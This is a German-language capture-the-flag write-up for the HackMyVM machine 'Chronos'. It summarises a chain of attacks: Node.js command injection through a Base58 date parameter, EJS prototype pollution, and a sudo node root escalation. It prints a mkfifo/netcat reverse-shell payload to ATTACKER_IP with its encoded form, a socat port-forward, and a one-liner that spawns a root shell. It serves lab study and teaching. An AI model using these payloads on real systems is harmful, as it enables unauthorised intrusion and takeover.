# Chronos - HackMyVM (Medium)

![Chronos Icon](Chronos.png)

## Übersicht

*   **VM:** Chronos
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Chronos)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 30. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Chronos_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Chronos" von HackMyVM (Schwierigkeitsgrad: Medium) erforderte die Ausnutzung mehrerer Schwachstellen, um Root-Zugriff zu erlangen. Der erste Zugriffspunkt war eine Command Injection-Schwachstelle in einer Node.js-Anwendung (Port 8000), die über einen Base58-kodierten Parameter in einem `/date`-Endpunkt ausgenutzt wurde. Dies führte zu einer Shell als `www-data`. Die Privilegienerweiterung zum Benutzer `imera` erfolgte durch die Ausnutzung einer Prototyp-Pollution-Schwachstelle in einer zweiten, nur lokal erreichbaren Node.js-Anwendung (EJS/express-fileupload). Schließlich ermöglichte eine unsichere `sudo`-Regel für `imera` die Ausführung von `node` als Root, was zur finalen Kompromittierung führte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `curl`
*   CyberChef (für Base58 De-/Encoding)
*   Burp Suite
*   `nc` (netcat)
*   `python3` (für Shell-Stabilisierung und Exploit-Skript)
*   `stty`
*   `socat` (für Port Forwarding)
*   `wget`
*   `EJS-RCE-attack.py` (Exploit-Skript)
*   `node` (für Exploitation und PrivEsc)
*   Standard Linux-Befehle (`ls`, `cat`, `uname`, `sudo`, `cd`, `netstat`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Chronos" verlief in folgenden Etappen:

1.  **Reconnaissance:**
    *   Ziel-IP (`192.168.2.115`, Hostname `chronos.local`) via `arp-scan` und `/etc/hosts`-Eintrag identifiziert.
    *   `nmap` zeigte offene Ports: 22 (OpenSSH 7.6p1), 80 (Apache 2.4.29) und **8000** (Node.js Express Framework).

2.  **Web Enumeration (Port 8000):**
    *   Der Apache-Server auf Port 80 bot wenig Angriffsfläche.
    *   Der Node.js-Dienst auf Port 8000 hatte einen `/date`-Endpunkt, der einen `format`-Parameter akzeptierte.
    *   Analyse (u.a. mit Base58-Dekodierung eines Beispiel-Payloads) ergab, dass der Parameter einen Datumsformatstring (vermutlich für `date` oder eine ähnliche Funktion) erwartete. Das führende `'+'` in einem dekodierten Beispiel deutete auf eine Command Injection-Möglichkeit hin.

3.  **Initial Access (RCE via Node.js Date Format - www-data):**
    *   Ein Reverse-Shell-Befehl wurde konstruiert, dem `'+;` vorangestellt und der gesamte String Base58-kodiert.
        *   Payload: `'+; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f'`
        *   Base58 kodiert: `2FKaCgCDhrKDtPk3bLhEKFzdkb681KiAmhhBzVoyVfzgkyBLM3dA97yHrZXeEwYs1K8fb8ssVzmwxHaedKHj2mw2LYQ2kdFujaLSrdwbsFL7ky`
    *   Der kodierte Payload wurde via GET-Request an `http://chronos.local:8000/date?format=[PAYLOAD]` gesendet.
    *   Eine Reverse Shell als Benutzer `www-data` wurde erfolgreich etabliert.

4.  **Privilege Escalation (www-data zu imera):**
    *   Enumeration als `www-data` deckte eine zweite Node.js-Anwendung im Verzeichnis `/opt/chronos-v2/backend` auf, die auf `127.0.0.1:8080` lauschte und EJS sowie `express-fileupload` (mit `parseNested: true`) verwendete – bekannt für Prototyp-Pollution-Schwachstellen.
    *   Mittels `socat TCP-LISTEN:5555,fork TCP:127.0.0.1:8080` wurde der interne Port 8080 auf den extern erreichbaren Port 5555 weitergeleitet.
    *   Das Exploit-Skript `EJS-RCE-attack.py` wurde heruntergeladen und angepasst, um eine Reverse Shell zum Angreifer-Port 9003 zu senden und das Ziel über den weitergeleiteten Port 5555 (`http://192.168.2.115:5555`) anzugreifen.
    *   Ausführung des Exploits führte zu einer Reverse Shell als Benutzer `imera`.
    *   Die User-Flag wurde aus `/home/imera/user.txt` gelesen.

5.  **Privilege Escalation (imera zu root):**
    *   `sudo -l` für `imera` zeigte: `(ALL) NOPASSWD: /usr/local/bin/npm` und `(ALL) NOPASSWD: /usr/local/bin/node`.
    *   Die `sudo`-Regel für `node` wurde ausgenutzt:
        `sudo -u root node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`
    *   Dies führte direkt zu einer Root-Shell.
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Command Injection via Format String:** Im Node.js-Dienst auf Port 8000 durch unsichere Verarbeitung eines Base58-kodierten Datumsformat-Parameters.
*   **Prototype Pollution (EJS & express-fileupload):** In der zweiten Node.js-Anwendung (Chronos-v2), die zu RCE führte.
*   **Port Forwarding mit `socat`:** Um einen nur lokal erreichbaren Dienst für den Exploit zugänglich zu machen.
*   **Unsichere `sudo`-Konfiguration:** Erlaubte die Ausführung von `node` (und `npm`) als Root ohne Passwort, was eine direkte Privilegienerweiterung ermöglichte.
*   **Node.js-Schwachstellen:** Mehrere Schwachstellen in Node.js-Anwendungen waren der Schlüssel zur Kompromittierung.

## Flags

*   **User Flag (`/home/imera/user.txt`):** `byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK`
*   **Root Flag (`/root/root.txt`):** `YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK`

## Tags

`HackMyVM`, `Chronos`, `Medium`, `Node.js`, `Command Injection`, `Base58`, `Prototype Pollution`, `EJS`, `express-fileupload`, `socat`, `Sudo Privilege Escalation`, `Web`, `Linux`
